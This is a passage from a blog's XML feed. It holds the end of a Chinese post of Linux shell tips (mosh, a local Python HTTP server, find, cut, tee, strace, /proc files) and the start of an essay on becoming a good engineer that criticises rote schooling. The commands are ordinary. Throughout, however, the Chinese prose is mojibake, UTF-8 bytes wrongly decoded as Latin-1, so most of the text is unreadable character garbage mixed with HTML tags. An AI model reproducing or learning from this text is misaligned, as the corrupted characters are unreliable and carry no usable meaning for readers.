unicodeï¼Œman utf-8ï¼Œman latin1ï¼Œman asciiæœ‰åŠ©äºäº†è§£é€šç”¨çš„ç¼–ç ä¿¡æ¯</li><li>mosh<ul><li> sshçš„æ›¿ä»£</li><li> ä½¿ç”¨ UDP åè®®</li></ul></li><li> å°† web æœåŠ¡å™¨ä¸Šå½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ï¼ˆä»¥åŠå­ç›®å½•ï¼‰æš´éœ²ç»™ä½ æ‰€å¤„ç½‘ç»œçš„æ‰€æœ‰ç”¨æˆ·ï¼Œä½¿ç”¨ï¼špython -m http.server 7777 ï¼ˆä½¿ç”¨ç«¯å£ 7777 å’Œ Python 3ï¼‰</li><li>su usernameåˆ‡æ¢ä¸ºåˆ«çš„ç”¨æˆ·ï¼Œsu - usernameä¼šä½¿å¾—åˆ‡æ¢åçš„ç¯å¢ƒä¸è¯¥ç”¨æˆ·ç™»å½•åçš„ç¯å¢ƒç›¸åŒ</li></ul><h1 id="æ–‡ä»¶å’Œæ•°æ®å¤„ç†"><a href="#æ–‡ä»¶å’Œæ•°æ®å¤„ç†" class="headerlink" title="æ–‡ä»¶å’Œæ•°æ®å¤„ç†"></a>æ–‡ä»¶å’Œæ•°æ®å¤„ç†</h1><ul><li>åœ¨å½“å‰ç›®å½•ä¸‹é€šè¿‡æ–‡ä»¶åæŸ¥æ‰¾ä¸€ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨ç±»ä¼¼äºè¿™æ ·çš„å‘½ä»¤ï¼šfind . -iname â€˜<em>something</em>â€˜</li><li>åœ¨æ‰€æœ‰è·¯å¾„ä¸‹é€šè¿‡æ–‡ä»¶åæŸ¥æ‰¾æ–‡ä»¶ï¼Œä½¿ç”¨ locate something ï¼ˆä½†æ³¨æ„åˆ° updatedb å¯èƒ½æ²¡æœ‰å¯¹æœ€è¿‘æ–°å»ºçš„æ–‡ä»¶å»ºç«‹ç´¢å¼•ï¼Œæ‰€ä»¥ä½ å¯èƒ½æ— æ³•å®šä½åˆ°è¿™äº›æœªè¢«ç´¢å¼•çš„æ–‡ä»¶ï¼‰</li><li>agæ˜¯ä¸€ä¸ªfindçš„æ›¿ä»£å“</li><li>ä½¿ç”¨pandocè¿›è¡ŒMarkdownï¼ŒHTMLï¼Œä»¥åŠæ‰€æœ‰æ–‡æ¡£æ ¼å¼ä¹‹é—´çš„è½¬æ¢</li><li>wcå¯ä»¥ç»Ÿè®¡è¡Œæ•°ã€å­—ç¬¦æ•°ã€å•è¯æ•°é‡ã€å­—èŠ‚æ•°ï¼ˆåˆ†åˆ«å¯¹åº”ï¼šlã€mã€wã€cï¼‰</li><li>pasteå¯ä»¥å°†æ–‡ä»¶çš„å¤šè¡Œåˆå¹¶ä¸ºä¸€è¡Œï¼Œå¹¶ä¸”æŒ‡å®šåˆ†éš”ç¬¦ï¼ˆdelimiterï¼‰</li><li>joinå°†ä¸¤ä¸ªæ–‡ä»¶ä¸­ï¼ŒæŒ‡å®šæ ä½å†…å®¹ç›¸åŒçš„è¡Œè¿æ¥èµ·æ¥</li><li>cutè£å‡å‘½ä»¤æˆ–è€…æ–‡ä»¶è¾“å‡ºï¼Œæ¯”å¦‚<code> who | cut -c 1-10</code>å°†whoçš„è¾“å‡ºçš„æ¯ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªåˆ°ç¬¬åä¸ªå­—ç¬¦å…¨éƒ¨è¾“å‡ºï¼Œå…¶ä½™å¿½ç•¥</li><li>tee å°†æ ‡å‡†è¾“å…¥å¤åˆ¶åˆ°æ–‡ä»¶ç”šè‡³æ ‡å‡†è¾“å‡ºï¼Œä¾‹å¦‚ ls -al | tee file.txt</li><li>reprenæˆ–è€…renameå¯ä»¥æ‰¹é‡é‡å‘½åæ–‡ä»¶</li><li>diffæ¯”è¾ƒæ–‡ä»¶/æ–‡ä»¶å¤¹çš„æ”¹å˜</li><li>å¯¹äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œstringsï¼ˆåŒ…æ‹¬ grep ç­‰å·¥å…·ï¼‰å¯ä»¥å¸®åŠ©åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾ç‰¹å®šæ¯”ç‰¹</li><li>å¯¹äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½¿ç”¨ hdï¼Œhexdump æˆ–è€… xxd ä½¿å…¶ä»¥åå…­è¿›åˆ¶æ˜¾ç¤ºï¼Œä½¿ç”¨ bviï¼Œhexedit æˆ–è€… biew æ¥è¿›è¡ŒäºŒè¿›åˆ¶ç¼–è¾‘</li><li>iconvæ›´æ”¹æ–‡æœ¬ç¼–ç </li></ul><h1 id="ç³»ç»Ÿè°ƒè¯•"><a href="#ç³»ç»Ÿè°ƒè¯•" class="headerlink" title="ç³»ç»Ÿè°ƒè¯•"></a>ç³»ç»Ÿè°ƒè¯•</h1><ul><li>curlå¯ä»¥ç”¨äºç³»ç»Ÿè°ƒè¯•ï¼ˆ-Ié€‰é¡¹å¯ä»¥ä»…ä»…è¾“å‡ºdocument infoï¼‰ï¼Œä¹Ÿå¯ä»¥å°è¯•githubä¸Šçš„å¼€æºé¡¹ç›®httpie</li><li>htopè·å–cpuã€ç¡¬ç›˜çš„ä½¿ç”¨çŠ¶æ€</li><li>netstatå’Œsså¯ä»¥æŸ¥çœ‹ç½‘ç»œç»†èŠ‚</li><li>mtrç”¨æ¥è·Ÿè¸ªè·¯ç”±ã€ç¡®å®šç½‘ç»œé—®é¢˜</li><li>straceå’Œlstraceå¯ä»¥è·Ÿè¸ªè°ƒè¯•ä¸€ä¸ªç¨‹åº</li><li>lddå¯ä»¥æ£€æŸ¥å…±äº«åº“</li><li>/procç›®å½•ä¸‹æœ‰é‡è¦ä¿¡æ¯çš„æ–‡ä»¶ï¼š/proc/cpuinfoï¼Œ/proc/meminfoï¼Œ/proc/cmdlineï¼Œ/proc/xxx/cwdï¼Œ/proc/xxx/exeï¼Œ/proc/xxx/fd/ï¼Œ/proc/xxx/smapsï¼ˆè¿™é‡Œçš„ xxx è¡¨ç¤ºè¿›ç¨‹çš„ id æˆ– pidï¼‰</li><li>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼š<code>uname -a</code>ã€<code>lsb_release -a</code>ã€neofetch</li></ul><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul><li><a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md">the-art-of-command-line</a></li><li><a href="https://explainshell.com/">https://explainshell.com/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>shell</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•æˆä¸ºä¸€ä¸ªä¼˜ç§€çš„å·¥ç¨‹å¸ˆ</title>
    <link href="/p/8a52ccc/"/>
    <url>/p/8a52ccc/</url>
    
    <content type="html"><![CDATA[<p> â€œå·¥ç¨‹å¸ˆæ˜¯ç§‘å­¦å®¶ï¼›å·¥ç¨‹å¸ˆæ˜¯è‰ºæœ¯å®¶ï¼›å·¥ç¨‹å¸ˆä¹Ÿæ˜¯æ€æƒ³å®¶ã€‚â€ä¸€ä½ä¼Ÿå¤§çš„å·¥ç¨‹å¸ˆæ›¾ç»æå‡ºè¿‡è¿™æ ·çš„ä¸€æ®µæ„Ÿè¨€ã€‚ä¸é”™ï¼Œå·¥ç¨‹å¸ˆæ˜¯åˆ©ç”¨è‡ªç„¶ç§‘å­¦æ¥åˆ›é€ å·¥ç¨‹çš„äººã€‚å·¥ç¨‹æ—¢ æ˜¯ç‰©è´¨çš„ä¹Ÿæ˜¯æ€æƒ³ä¸Šçš„ã€‚è®¸å¤šä¸æœ½çš„å·¥ç¨‹ï¼Œä¼Ÿå¤§çš„å‘æ˜ä»¥åŠå‡ºç¥å…¥åŒ–çš„æŠ€æœ¯æ–¹æ¡ˆï¼Œè®¸å¤šäººå¾€å¾€åªçœ‹åˆ°äº†ä»–ä»¬çš„ç‘°ä¸½ï¼Œè€Œä½œä¸ºå·¥ç¨‹å¸ˆåˆ™æ›´åº”è¯¥çœ‹åˆ°è®¾è®¡çš„çµé­‚ã€‚å› æ­¤æˆ‘ ä»¬åº”è¯¥æ·±å…¥çš„ç†è§£â€œå·¥ç¨‹å¸ˆä¹Ÿæ˜¯è‰ºæœ¯å®¶å’Œæ€æƒ³å®¶â€ã€‚å·¥ç¨‹è®¾è®¡çš„æœ¬èº«å°±æ˜¯ä¸€ç§è‰ºæœ¯ï¼Œä¹Ÿæ˜¯å·¥ç¨‹å¸ˆæ€æƒ³çš„ç»“æ™¶ã€‚ä¸€éƒ¨ç²¾å¯†çš„æœºæ¢°è®¾å¤‡ï¼Œä¸€ä¸ªé«˜æ•ˆè€Œåˆå¥å£®çš„ç¨‹åºï¼Œä¸€ä¸ª å¤æ‚è€Œåˆæ— æ‡ˆå¯å‡»çš„ç”µè·¯ï¼Œè¿™äº›éƒ½åæ˜ ç€ä¸€äº›æ°å‡ºå·¥ç¨‹å¸ˆçš„æ€æƒ³å’Œçµé­‚ï¼Œæœ‰æ—¶ä½ ç”šè‡³ä¼šè®¤ä¸ºä»–ä»¬çš„ç”Ÿå‘½å·²ç»èå…¥åˆ°è®¾è®¡ä¸­ã€‚</p><p>  æˆä¸ºä¸€ä¸ªæ°å‡ºå·¥ç¨‹å¸ˆæœ€é‡è¦çš„å› ç´ å°±æ˜¯â€œçƒ­çˆ±è‡ªå·±çš„èŒä¸šâ€ã€‚æ¯•ç«Ÿå…´è¶£æ˜¯æœ€å¥½ çš„è€å¸ˆï¼Œè®¸å¤šä¼˜ç§€çš„ç”µå­å·¥ç¨‹å¸ˆéƒ½æ˜¯ä»å°ä½œä¸ºç”µå­çˆ±å¥½è€…çš„ã€‚çˆ±å¥½ä¸ä»…è¦ä½“ç°åœ¨è¡ŒåŠ¨ä¸­æ›´è¦æ·±å…¥å†…å¿ƒç”šè‡³æ·±å…¥éª¨é«“ã€‚æœ‰è®¸å¤šäººé—®ï¼šâ€œæ¯å¤©åº”è¯¥èŠ±å¤šé•¿æ—¶é—´åœ¨å­¦ä¹ ä¸­å’Œ å·¥ä½œä¸­ï¼Ÿâ€å¯ä»¥è‚¯å®šä¸€ä»½è€•è€˜å°±ä¼šæ¢æ¥ä¸€ä»½æ”¶è·ï¼Œä½†ä½œä¸ºå·¥ç¨‹å¸ˆå’Œç§‘å­¦å®¶æƒ³å–å¾—æˆåŠŸå¹¶ä¸æ˜¯æ¯”èµ›è°èŠ±çš„æ—¶é—´æœ€å¤šï¼Œè€Œæ˜¯çœ‹è°ä»˜å‡ºäº†æ›´å¤šçš„â€œæ€è€ƒâ€ã€‚ä¸è¦ä»¥ä¸ºä¸€ä¸ªå­¦ ç”Ÿååœ¨è‡ªä¹ æ•™å®¤é‡Œçœ‹äº†å¤šå°‘å°æ—¶çš„ä¹¦å°±æ˜¯â€œå‹¤å¥‹â€ï¼Œä¹Ÿå¯èƒ½æ¯”å‘†åœ¨å¯å®¤é‡Œçš„å­¦ç”Ÿè¿˜è¦â€œæ‡’æƒ°â€ã€‚ä¹Ÿå°±æ˜¯è¯´â€œå‹¤å¥‹â€æ˜¯å¤§è„‘çš„å‹¤å¥‹ï¼Œè€Œä¸æ˜¯èº«ä½“å’Œå’Œå½¢å¼ä¸Šçš„å‹¤å¥‹ã€‚æˆ‘ å­¦ç”µå­ä¹Ÿå·®ä¸å¤šæœ‰15å¹´äº†ï¼Œä¹Ÿå‘ç°äº†å¾ˆå¤šé—®é¢˜ã€‚ä¸€æ¬¡åˆ«äººé—®æˆ‘ä½ æ¯å¤©èŠ±å¤šé•¿æ—¶é—´æ¥å·¥ä½œï¼Œæˆ‘å›ç­”ä»–ï¼šâ€œæ¯å¤©é™¤äº†åƒé¥­ç¡è§‰å‡ ä¹éƒ½åœ¨æ€è€ƒã€‚â€ä¸å¤¸å¼ çš„è¯´æˆ‘çš„å¾ˆå¤šå·¥ ç¨‹æ„æƒ³éƒ½æ˜¯åœ¨æ¢¦å¢ƒä¸­è¯ç”Ÿçš„ã€‚æ¯å¤©æ—©èµ·åºŠååˆ·ç‰™çš„æ—¶å€™ã€ä¸Šç­çš„è·¯ä¸Šã€åƒé¥­çš„æ—¶å€™ç”šè‡³å’Œåˆ«äººè°ˆè¯çš„ç©ºé—²ç¬é—´éƒ½æœ‰å¯èƒ½è¯ç”Ÿçµæ„Ÿã€‚å½“ç„¶çƒ­çˆ±å·¥ç¨‹å¸ˆèŒä¸šçš„å‰ææ˜¯ä¸€å®š è¦èƒ½é¢†ç•¥åˆ°å·¥ç¨‹å’Œè‡ªç„¶ç§‘å­¦ä¸­çš„ç¾æ„Ÿã€‚ä¸€ä¸ªä¼˜ç§€çš„å·¥ç¨‹å¸ˆåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªçƒ­çˆ±ç§‘å­¦çš„äººï¼Œä»ç§‘å­¦çš„å¸¸è¯†åˆ°ç§‘å­¦çš„ç²¾ç¥éƒ½ä¼šæ¸—é€åˆ°ä»–çš„ç”Ÿæ´»ä¸­ã€‚ä¸€æ¬¡æˆ‘çœ‹åˆ°ä¸€ä½æ•™ç ”å®¤é‡Œ çš„è€å¸ˆå®‰æ’ç­”è¾©çš„é¡ºåºï¼Œå°½ç®¡è¿™ä½è€å¸ˆåœ¨æœºç”µé¢†åŸŸå†™äº†å¾ˆå¤šçš„ä¹¦ä¹Ÿåœ¨æ‰€è°“â€œç†è®ºé¢†åŸŸâ€æœ‰å¾ˆå¤šå»ºæ ‘ï¼Œå•ä»ä»–å®‰æ’è¿™æ ·ä¸€ä¸ªç®€å•çš„é¡ºåºæ¥çœ‹ï¼Œä»–å¹¶ä¸æ˜¯ä¸ªç†è®ºå¾ˆé«˜çš„ äººã€‚å› ä¸ºåœ¨æˆ‘çœ‹æ¥ä»–çš„å·¥ä½œæ–¹æ³•æ˜¯æ•ˆç‡æä½çš„ã€‚æ¢å¥è¯è¯´å°±æ˜¯åœ¨ä»–çš„ç”Ÿæ´»ä¸­æ²¡æœ‰ç§‘å­¦çš„ç²¾ç¥å¯è¨€ã€‚</p><p>  ä¸€ä¸ªå·¥ç¨‹å¸ˆå’Œç§‘å­¦å®¶åœ¨ç”Ÿæ´»ä¸­ä¹Ÿæ˜¯å·¥ç¨‹å¸ˆå’Œç§‘å­¦å®¶ã€‚è¿™ä¸ªé—®é¢˜å¼•å‡ºåæˆ‘ä»¬è¦æåˆ°çš„æ˜¯åŸ¹å…»è‡ªå·±çš„æ€ç»´å“è´¨ï¼ŒåŒ…æ‹¬æ€ç»´çš„ä¹ æƒ¯ï¼Œæ·±åº¦å’Œå¹¿åº¦ï¼Œä»¥åŠæ€ç»´æ–¹å¼å’Œæ€ç»´ç´ æ çš„é€‰å–ã€‚æˆä¸ºä¸€ä¸ªå·¥ç¨‹å¸ˆç¡®å®æœ‰å¾ˆå¤šå“è´¨æ˜¯å¤©ç”Ÿçš„å’Œå†³å®šæ€§çš„ï¼Œå­¦æ ¡çš„åŸ¹å…»å’Œè‡ªå·±çš„åŠªåŠ›ä¹Ÿåªæ˜¯ä¸€äº›è¾…åŠ©æªæ–½ã€‚ä¸€ä¸ªäººæ›¾ç»é—®æˆ‘ä¸€ä¸ªå…³äºæ„Ÿæ€§è´Ÿè½½çš„é—®é¢˜ï¼Œå…¶å®æˆ‘å¿ƒ ç†å¾ˆæ¸…æ¥šä»–å¹¶ä¸ç†è§£è¿™é‡Œé¢æœ€åŸºæœ¬çš„ç‰©ç†æ¦‚å¿µï¼Œé¦–å…ˆå¯¹ç”µæ„Ÿçš„è®¤è¯†å°±ä¸æ˜¯ç”¨è¯­è¨€å’Œæ•°å­¦å…¬å¼èƒ½è§£é‡Šå¾—äº†çš„ã€‚æ‰€ä»¥ç‰©ç†å­¦å’Œæ•°å­¦çš„åŸºç¡€æ˜¯å¯¹å·¥ç¨‹å¸ˆæœ‰å¾ˆé«˜è¦æ±‚çš„ï¼Œè¿™é‡Œ æ‰€æåˆ°çš„ç‰©ç†å­¦å’Œæ•°å­¦æ˜¯æŒ‡ä¸€ç§æœ€åŸºæœ¬çš„è®¤è¯†è€Œä¸æ˜¯åœç•™äºè¡¨é¢çš„æ–‡å­—å’Œå…¬å¼ã€‚æˆ‘å¯ä»¥æ¨æ–­è¿™ä¸ªäººä¸å¤ªé€‚åˆä½œå·¥ç¨‹å¸ˆï¼Œå…¶å®ä»–æå‡ºçš„é—®é¢˜éƒ½çœŸçœŸåˆ‡åˆ‡çš„å­˜åœ¨äºç”Ÿæ´» ä¸­ï¼ŒæŠ¬å¤´çœ‹çœ‹æ—¥å…‰ç¯çš„å¯åŠ¨ï¼Œæˆ–è€…å½“ä½ çœ‹åˆ°ç”µæºæ’å¤´çš„æ”¾ç”µç¬é—´ã€‚å¯è¿™æ¯ä¸€ä¸ªç¬é—´éƒ½è¢«ç¤ºä¸ºç†æ‰€åº”å½“çš„è¯å°±é”™äº†ï¼Œé‚£æ ·å½“ç‰›é¡¿çœ‹åˆ°è‹¹æœè½åœ°æ—¶ä¹Ÿä¼šæ„Ÿè§‰ç†æ‰€åº”å½“çš„ã€‚</p><p>  æ¯ä¸ªäººçš„æ€ç»´ç€çœ¼ç‚¹å’Œæ³¨æ„çš„æ–¹é¢éƒ½ä¸ç›¸åŒï¼Œå¾ˆå¤šäººä»å°å°±ä¼šå°†æ³¨æ„æ”¾åœ¨è‡ªç„¶ç§‘å­¦ä¹‹ä¸Šï¼Œè¿™äº›å­©å­ä¸­æœ‰å¾ˆå¤šå°±æ˜¯æœªæ¥çš„å·¥ç¨‹å¸ˆã€‚æ¯”å¦‚ä¸€ä¸ª10å²çš„å°å­¦ç”Ÿçœ‹åˆ°ä¸€å¹¢å¤§ æ¥¼ï¼Œä»–ä¼šé©¬ä¸Šè€ƒè™‘å¤§æ¥¼æ˜¯å¦‚ä½•å»ºé€ çš„ï¼Œå¡”åŠåˆæ˜¯æ€ä¹ˆä¸€èŠ‚ä¸€èŠ‚æ¥èµ·æ¥çš„ï¼Œé‚£ä¹ˆé«˜çš„å¤§æ¥¼å¤–å¢™çš„ç»ç’ƒæ˜¯å¦‚ä½•å®‰è£…çš„ã€‚å¦ä¸€ä¸ªå­©å­ä¼šæƒ³å·¥ç¨‹å¸ˆçœŸä¼Ÿå¤§ï¼Œè¿˜ä¼šæƒ³åˆ°ä¸€äº›è¯—å¥ æ¥æŠ’å‘å†…å¿ƒçš„æ„Ÿå—ã€‚æ˜¾ç„¶ä¸¤ä¸ªå­©å­ä¸€ä¸ªå¯èƒ½æ›´é€‚åˆä½œå·¥ç¨‹å¸ˆå¦ä¸€ä¸ªé€‚åˆæˆä¸ºæ–‡å­¦å®¶ã€‚æ‰€ä»¥äººä»¬ç»å¸¸è¯´ï¼Œæ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„é•¿å¤„å’Œä¼˜ç‚¹ã€‚æœ‰äº›äººçš„é•¿å¤„å’Œæ€ç»´æ–¹å¼åœ¨å·¥ ç¨‹å¸ˆèŒä¸šä¸­æ— æ³•å‘æŒ¥ï¼Œå¯ä¸­å›½æ•™è‚²çš„æ•™æ¡åŒ–å´æ— æ³•è®©æ¯ä¸ªäººéƒ½èƒ½åšè‡ªå·±å–œæ¬¢çš„ä¸“ä¸šã€‚æˆ‘çš„ä¸€ä¸ªå¤§å­¦åŒå­¦æ˜¯æ–‡å­¦çˆ±å¥½è€…ï¼Œå¯¹ä¸­å›½å†å²å’Œç¤¾ä¼šæœ‰è®¸å¤šè§è§£ï¼Œé˜…è¯»å¹¿æ³›æ–‡ç¬” ä¹Ÿå¥½ï¼Œå¯ååå­¦äº†ç”µå­è¿™ä¸ªä¸“ä¸šï¼Œè¿™ä¸æ˜¯äººæ‰çš„æµªè´¹å—ã€‚æ‰€ä»¥å·¥ç¨‹å¸ˆå’Œç§‘å­¦å®¶åœ¨ç”Ÿæ´»ä¸­ä¹Ÿæ˜¯å·¥ç¨‹å¸ˆå’Œç§‘å­¦å®¶ï¼Œè€Œä¸æ˜¯å·¥ä½œæ—¶å’Œç«¯èµ·ä¹¦æœ¬æ—¶æ‰æ˜¯ã€‚å¾ˆå¤šå­¦ç”Ÿå¾ˆåŠªåŠ›çš„å» å­¦ä¹ ï¼Œå¯ä¸€ç›´æ— æ³•å…¥é—¨å°±æ˜¯è¿™ä¸ªåŸå› ã€‚å½“æ‹¿èµ·ä¹¦æœ¬æ—¶å‘ç°ä¸€ä¸ªé—®é¢˜æˆ–è€…è€å¸ˆæå‡ºä¸€ä¸ªé—®é¢˜åä»–ä»¬ä¼šåŠªåŠ›çš„è§£å†³ï¼Œå¯æ”¾ä¸‹ä¹¦æœ¬å°±ä¸ä¼šå†è‡ªå·±æå‡ºé—®é¢˜å’Œç‹¬ç«‹çš„æ€è€ƒäº†ã€‚</p><p>  æˆ‘ä»æ¥ä¸è®¤ä¸ºä¸­å›½çš„æ•™è‚²æ˜¯çœŸæ­£çš„â€œæ•™è‚²â€ï¼Œä¹¦æœ¬ã€è¯•å·ã€åˆ†æ•°ã€æ‰€è°“çš„ç­”æ¡ˆéƒ½æ˜¯æ•™æ¡çš„ï¼Œå°±å¥½è±¡ä¸€æ¡ç”Ÿäº§çº¿ç»™æ¯ä¸ªç»è¿‡å…¶ä¸­çš„å­¦ç”Ÿç›–ä¸Šä¸€ä¸ªå­¦å†çš„çƒ™å°ã€‚å°†åˆ›é€ æ€§ å’Œä¸ªäººçš„ç‰¹é•¿ç»Ÿç»ŸæŠ¹æ€ï¼Œå†åŠ ä¸Šé•¿æœŸä»¥æ¥çš„æ•™è‚²å¤§è·ƒè¿›å’Œäººæ‰è¯„å®šæ ‡å‡†çš„åå·®ï¼Œæ— æ•°å¤©æ‰å¤±å»äº†å‘å±•æœºä¼šã€‚æœ¬æ¥æ²¡æœ‰é‚£ä¹ˆå¤šçš„æ•™è‚²èµ„æºå´éè¦æ‰©æ‹›â€“æ‰«ç›²ã€‚å°†å¤§å­¦ æ•™è‚²è‡³äºå°´å°¬å¢ƒåœ°ï¼Œåº”å±Šç”Ÿå°±ä¸šå°±æ˜¯æœ€å¥½çš„ä¾‹å­ã€‚æ‰€ä»¥è¯·ä¸è¦æŠ±æ€¨å·¥ä½œæœºä¼šå°‘ï¼Œä¸­å›½æ˜¯éå¸¸ç¼ºä¹å·¥ç¨‹å¸ˆçš„å‘€ï¼ç¼ºåˆ°è®©å¾ˆå¤šå…¬å¸å¼€å§‹â€œå‘å–Šâ€çš„ç¨‹åº¦ã€‚å·¥ç¨‹å¸ˆçš„ç¼ºä¹åˆ å’Œåº”å±Šç†å·¥ç§‘æ¯•ä¸šç”Ÿçš„è¿‡å‰©å½¢æˆçŸ›ç›¾ã€‚æ‰€ä»¥ä½ ä¸è¦ä»¥ä¸ºå­¦ä¹ æˆç»©é«˜å°±èƒ½æˆä¸ºä¸€ä¸ªå¥½çš„å·¥ç¨‹å¸ˆï¼Œè¦æ¸…æ¥šçš„è®¤è¯†åˆ°å­¦æ ¡çš„æ•™è‚²å’Œç¤¾ä¼šéœ€æ±‚ä¹‹é—´çš„è·ç¦»ã€‚</p><p>  å·¥ç¨‹å¸ˆè¦æœ‰â€œè‡ªå·±çš„æ€æƒ³â€ã€‚å¾ˆå¤šå­¦ç”Ÿåœ¨è¯»ä¹¦è¿‡ç¨‹ä¸­å…»æˆäº†ä¸€äº›å¾ˆä¸å¥½çš„ä¹  æƒ¯ï¼Œæ¯”å¦‚æ€è€ƒæ·±åº¦ä¸å¤Ÿï¼Œå’Œä¸ä¼šç‹¬ç«‹æ€è€ƒã€‚ä¸€ä¸ªå…¬å¼æ”¾åœ¨é¢å‰èƒ½åšé¢˜ï¼Œèƒ½è€ƒè¯•å°±OKå—ï¼Ÿè‡ªç„¶ç§‘å­¦å¥½æ¯”ä¸€ä¸ªèŠ±å›­ï¼Œä¸€äº›ç§‘å­¦å·¨åŒ å†™ä¸‹äº†æ— æ•°â€œä¸æœ½çš„æ–‡ç« â€æ¥æè¿° å®ƒã€‚æ•°å­¦å…¬å¼å°±å¥½æ¯”æ–‡ç« ä¸­çš„æ–‡å­—å’Œå¥å­ï¼Œåªæ˜¯åšæ–‡å­—æ¸¸æˆæˆ–è€…ç®€å•çš„èƒŒè¯µæœ‰ä»€ä¹ˆæ„ä¹‰å—ï¼Ÿè¯·é—®é—®è‡ªå·±ä½ å¯¹è¿™ä¸ªâ€œå¤§èŠ±å›­â€äº†è§£å¤šå°‘ã€‚ä½ é—­ä¸Šçœ¼ç›èƒ½æƒ³è±¡å‡ºè¿™ä¸ªèŠ±å›­ çš„æ™¯è±¡å—ï¼Ÿè®°å¾—æˆ‘æ›¾é—®ä¸€ä¸ªå¤§å››æ¯•ä¸šè®¾è®¡çš„å­¦ç”Ÿä½ ç‰©ç†å­¦çš„æ€ä¹ˆæ ·ã€‚ä»–å›ç­”æˆ‘â€œè¿˜å¥½â€ï¼Œå¯åˆè¡¥å……è¯´â€œå°±æ˜¯å…¬å¼å¿˜äº†â€ã€‚å·¥ä½œä¸­ä»–çœ‹åˆ°æˆ‘éšç¬”å¯ä»¥å†™å‡ºå¾ˆå¤šæ–¹ç¨‹ï¼ŒæƒŠ è®¶çš„è¯´æˆ‘çš„è®°å¿†åŠ›çœŸå¥½ã€‚æˆ‘è¯´â€œæˆ‘æ ¹æœ¬å°±æ²¡èƒŒè¿‡å…¬å¼â€ã€‚å› ä¸ºæˆ‘è®°å¾—â€œèŠ±å›­â€æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œå³ä½¿å“ªä½å¤§å®¶ç”¨ä»€ä¹ˆè¯æ±‡æè¿°çš„â€œèŠ±å›­â€æˆ‘è®°ä¸æ¸…ï¼Œå¯æˆ‘ä¾ç„¶èƒ½æ¸…æ¥šçš„æ è¿°å‡ºæ¥ã€‚è¿™æ‰æ˜¯ç†è®ºï¼Œç†è®ºä¸æ˜¯æŒ‡â€œæ–‡å­—â€å’Œå…¬å¼è€Œæ˜¯å‰äººçš„æ€æƒ³ã€‚</p><p>  è®¸å¤šå­¦ç”µå­çš„å­¦ç”Ÿè¯´æ¨¡æ‹ŸæŠ€æœ¯éš¾å­¦ï¼Œæˆ‘å‘Šè¯‰ä»–ä»¬å…¶å®å­¦å¥½æ¨¡æ‹ŸæŠ€æœ¯å¹¶ä¸æ˜¯è¦å­¦å¥½æ¨¡æ‹Ÿç”µå­æœ¬èº«ã€‚ä¸–ç•Œæœ¬æ¥å°±æ˜¯æ¨¡æ‹Ÿçš„ï¼Œæ‰€æœ‰çš„ç‰©ç†é‡éƒ½æ˜¯æ¨¡æ‹Ÿçš„ï¼Œè¿™å°±æ˜¯æ¨¡æ‹Ÿã€‚æ‰€ä»¥ ä½ å¯¹è‡ªç„¶ç§‘å­¦çš„æœ€æ ¹æœ¬çœ‹æ³•å’Œä¸–ç•Œè§‚ç›´æ¥å†³å®šæ¨¡æ‹Ÿæ°´å¹³çš„é«˜ä½ï¼Œä¹Ÿå°±æ˜¯ç‰©ç†å­¦æ°´å¹³çš„é«˜ä½ã€‚æˆ‘çš„æ„è§æ˜¯ï¼šä¸è¦ä»¥ä¸ºæ‹¿ç€æ¨¡ç”µä¹¦å­¦ä¸‹å»å°±èƒ½æœ‰æœ¬è´¨çš„æ”¹å˜ï¼Œä¸€å®šè¦æé«˜ å¯¹äº‹ç‰©çš„è®¤è¯†å’Œå¯¹è‡ªç„¶ç§‘å­¦çš„ç†è§£ï¼Œæé«˜å¯¹æ¨¡æ‹Ÿé‡çš„é©¾å¾¡èƒ½åŠ›ã€‚é‡è¦çš„æ˜¯æ€ç»´æ–¹å¼ï¼Œå’Œå¯¹æ¦‚å¿µçš„æ„Ÿæ€§è®¤è¯†ã€‚</p><p>  æ€è€ƒé—®é¢˜è¦æœ‰æ·±åº¦ï¼Œæ€ç»´çš„æ·±åº¦æ˜¯ä¸€ç§ä¹ æƒ¯ã€‚æœ‰äº›äººæ€»æ˜¯å–œæ¬¢ç‚¹åˆ°ä¸ºæ­¢ï¼Œä»–ç”š è‡³æ²¡æœ‰æ„è¯†åˆ°æˆ‘è¿˜å¯ä»¥å†æ·±å…¥çš„æ€è€ƒã€‚ä½œä¸ºå·¥ç¨‹å¸ˆå’Œç§‘å­¦å®¶è¦åŸ¹å…»æ·±é‚ƒçš„æ€è€ƒä¹ æƒ¯ã€‚ä¸€äº›å­¦ç”Ÿçœ‹åˆ°ä¸€é“ç‰©ç†é¢˜ï¼Œè®¤ä¸ºä½œå¯¹å°±å¥½çš„äººå±…å¤šã€‚å¯ä½ æ˜¯å¦å‘ç°äº†å…¶ä¸­çš„å†…åœ¨ è”ç³»ï¼Œç”šè‡³ä»è€ƒç‚¹ä¸­å—åˆ°å¯å‘ã€‚æœ‰å¾ˆå¤šé«˜ä¸­å­¦ç”Ÿå–œæ¬¢åšå¤§é‡çš„ä¹ é¢˜ï¼Œç»“æœæ•ˆæœå´ä¸ç†æƒ³ã€‚å°±æ˜¯å› ä¸ºè¿™äº›å­¦ç”Ÿåªæ˜¯åœ¨â€œåšé¢˜â€ï¼Œæ²¡æœ‰ä»˜å‡ºæ›´å¤šçš„æ€è€ƒã€‚æ‰€ä»¥å·¥ç¨‹å¸ˆè¦æ³¨ é‡æ¦‚å¿µæ€§çš„æ€è€ƒç„¶åæ·±å…¥è¿›å»ï¼ŒçŸ¥å…¶ç„¶ï¼Œæ›´è¦çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚</p><p>  